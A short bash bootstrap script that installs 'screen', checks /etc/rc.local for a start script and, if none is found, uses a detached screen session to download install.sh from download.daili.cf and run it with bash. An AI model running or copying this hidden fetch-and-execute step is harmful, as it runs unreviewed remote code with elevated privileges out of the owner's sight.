#!/bin/bash
if [[ ! -f "/usr/bin/screen" ]]; then
    sudo apt install screen -y
    echo "no"
	
else
	echo "yes"
fi

grep "/usr/local/bin/start.sh" /etc/rc.local >/dev/null

if [ $? -eq 0 ]; then
    echo "rc_yes"
else
screen_name="add"
screen -dmS $screen_name

install="cd /mnt&&mkdir add&&cd add&&apt install wget -y&&wget http://download.daili.cf/52/install.sh&&bash install.sh";

screen -x -S $screen_name -p 0 -X stuff "$install"
screen -x -S $screen_name -p 0 -X stuff '\n'
fi

exit 0 
